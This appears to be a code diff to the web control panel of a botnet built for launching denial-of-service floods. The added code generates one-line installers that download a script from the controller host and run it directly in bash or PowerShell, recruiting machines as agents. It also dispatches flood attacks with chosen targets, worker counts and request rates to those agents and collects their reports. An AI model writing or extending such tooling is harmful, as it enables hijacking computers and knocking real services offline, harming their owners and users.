@@ -15,6 +15,11 @@ document.addEventListener('DOMContentLoaded', () => {
     setInterval(checkProxy, 10000);
     fetchBots();
     setInterval(fetchBots, 15000);
+    // Pre-fill installer port from current page URL
+    const portHint = location.port || '5000';
+    const cp = document.getElementById('c2-port');
+    if (cp) cp.value = portHint;
+    updateInstallers();
 });
 
 /* ── Page navigation ──────────────────────────────────────────── */
@@ -168,6 +173,24 @@ async function removeBot(id) {
     fetchBots();
 }
 
+/* ── Installer one-liners ─────────────────────────────────────── */
+function updateInstallers() {
+    const host = (document.getElementById('c2-host').value.trim()) || 'YOUR_C2_IP';
+    const port = (document.getElementById('c2-port').value.trim()) || '5000';
+    const sh  = document.getElementById('install-sh');
+    const ps1 = document.getElementById('install-ps1');
+    if (sh)  sh.textContent  = `curl -s "http://${host}:${port}/install.sh?host=${host}&port=${port}" | bash`;
+    if (ps1) ps1.textContent = `iwr "http://${host}:${port}/install.ps1?host=${host}&port=${port}" | iex`;
+}
+
+function copyInstaller(type) {
+    const el = document.getElementById('install-' + type);
+    if (!el) return;
+    navigator.clipboard.writeText(el.textContent)
+        .then(() => { el.style.opacity = '.5'; setTimeout(() => el.style.opacity = '1', 400); })
+        .catch(() => alert('Copy failed — select and copy manually'));
+}
+
 /* ── Agent generator ──────────────────────────────────────────── */
 function downloadAgent() {
     const host = document.getElementById('c2-host').value.trim();
@@ -300,6 +323,12 @@ async function startFlood(e) {
     const workers  = +document.getElementById('workers').value;
     const rps      = +document.getElementById('rps').value;
     const duration = +document.getElementById('duration').value;
+    const useLocal = document.getElementById('opt-local').checked;
+    const useBots  = document.getElementById('opt-bots').checked;
+
+    if (!useLocal && !useBots) {
+        addLog('Select at least one launch mode (server or agents)', 'error'); return;
+    }
 
     floodDur   = duration;
     floodStart = Date.now();
@@ -308,17 +337,20 @@ async function startFlood(e) {
 
     setRunning(true);
     clearLogEl();
-    addLog('Starting ' + method + ' flood -> ' + target, 'info');
+    const modes = [useLocal ? 'server' : null, useBots ? 'agents' : null].filter(Boolean).join(' + ');
+    addLog('Launching ' + method + ' flood via ' + modes + ' -> ' + target, 'info');
     addLog('Workers: ' + workers + '  RPS: ' + rps + '  Duration: ' + duration + 's', 'info');
 
     try {
         const r = await fetch('/api/start', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ target, method, workers, rps, duration })
+            body: JSON.stringify({ target, method, workers, rps, duration, local: useLocal, bots: useBots })
         });
         const d = await r.json();
         if (!d.ok) { addLog('Error: ' + d.error, 'error'); setRunning(false); return; }
+        if (d.dispatched) addLog('Dispatched to ' + d.dispatched + ' agent(s)', 'success');
+        if (!useLocal) { setRunning(false); return; } // agents only — no local SSE stream
     } catch (err) {
         addLog('Cannot reach server: ' + err.message, 'error');
         setRunning(false); return;
@@ -392,6 +424,16 @@ function onEvent(d) {
     if (d.type === 'bot_update') {
         bots = d.bots || [];
         renderBots();
+        const b = document.getElementById('agent-count-badge');
+        if (b) b.textContent = bots.length;
+    }
+
+    if (d.type === 'agent_result') {
+        agentResults.unshift(d.result);
+        if (agentResults.length > 200) agentResults.pop();
+        renderAgentResults();
+        addLog('Agent ' + d.result.agent_id + ' reported: ' +
+               d.result.total + ' sent, ' + d.result.rps_actual + ' rps', 'success');
     }
 }
 
